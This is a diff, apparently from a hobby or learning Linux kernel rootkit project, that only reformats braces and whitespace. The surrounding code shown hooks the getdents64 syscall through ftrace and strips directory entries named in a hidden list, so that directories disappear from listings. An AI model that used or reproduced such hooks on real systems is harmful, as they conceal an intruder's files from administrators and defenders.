@@ -9,7 +9,7 @@
 // If I do not define it here, I have a compilation error... does not seem to be included in linux headers
 // (tried dirent.h, with no success)
 // (at least not in the ones I have on my system LOL)
-struct linux_dirent64 { 
+struct linux_dirent64 {
     u64 d_ino;
     s64 d_off;
     unsigned short d_reclen;
@@ -39,8 +39,7 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs);
  * @dirname: The directory name to remove.
  * @return 0 on success or a negative error code on failure.
  */
-int add_hidden_dir(const char *dirname)
-{
+int add_hidden_dir(const char *dirname) {
     struct hidden_dir_entry *entry;
 
     // Allocate memory for the new hidden directory entry.
@@ -65,12 +64,11 @@ int add_hidden_dir(const char *dirname)
 
 /**
  * @brief Removes a directory name from the dynamic hidden directories list.
- * 
+ *
  * @dirname: The directory name to remove.
  * @return 0 on success or -ENOENT if the directory name is not found.
  */
-int remove_hidden_dir(const char *dirname)
-{
+int remove_hidden_dir(const char *dirname) {
     struct hidden_dir_entry *entry, *tmp;
     int found = 0;
 
@@ -92,12 +90,11 @@ int remove_hidden_dir(const char *dirname)
 
 /**
  * @brief Checks if a given directory name is in the hidden list.
- * 
+ *
  * @name: The directory name to check.
  * @return 1 if the directory is to be hidden, 0 otherwise.
  */
-int is_hidden(const char *name)
-{
+int is_hidden(const char *name) {
     struct hidden_dir_entry *entry;
     int hidden = 0;
 
@@ -116,7 +113,7 @@ int is_hidden(const char *name)
 asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs);
 
 // Function to hook the getdents64 syscall
-asmlinkage int getdents64_hook(const struct pt_regs *regs){
+asmlinkage int getdents64_hook(const struct pt_regs *regs) {
     // Store the result (number of bytes read) by the original syscall
     int ret;
 
@@ -141,8 +138,7 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs){
     if (!kbuf)
         return ret;
 
-    if (copy_from_user(kbuf, user_dir, ret))
-    {
+    if (copy_from_user(kbuf, user_dir, ret)) {
         kfree(kbuf);
         return ret;
     }
@@ -153,8 +149,7 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs){
     // Allocate a second temporary buffer to store the non-hidden directory
     // entries
     char *newbuf = kmalloc(ret, GFP_KERNEL);
-    if (!newbuf)
-    {
+    if (!newbuf) {
         kfree(kbuf);
         return ret;
     }
@@ -166,13 +161,14 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs){
         // For each entry, get the pointer to its linux_dirent64 structure
         struct linux_dirent64 *d = (struct linux_dirent64 *)(kbuf + offset);
 
-         // Length of the current directory entry
+        // Length of the current directory entry
         int reclen = d->d_reclen;
 
         // Check if the entry name matches a directory that should be hidden
         if (is_hidden(d->d_name)) {
             new_size -= reclen;
-        } else {
+        }
+        else {
             memcpy(newbuf + new_off, d, reclen);
             new_off += reclen;
         }
@@ -196,6 +192,6 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs){
 
 // Array of hooks to install.
 size_t hook_array_size = 1;
-struct ftrace_hook hooks[] = { 
-    HOOK("sys_getdents64", getdents64_hook, &__orig_getdents64) 
+struct ftrace_hook hooks[] = {
+    HOOK("sys_getdents64", getdents64_hook, &__orig_getdents64)
 };
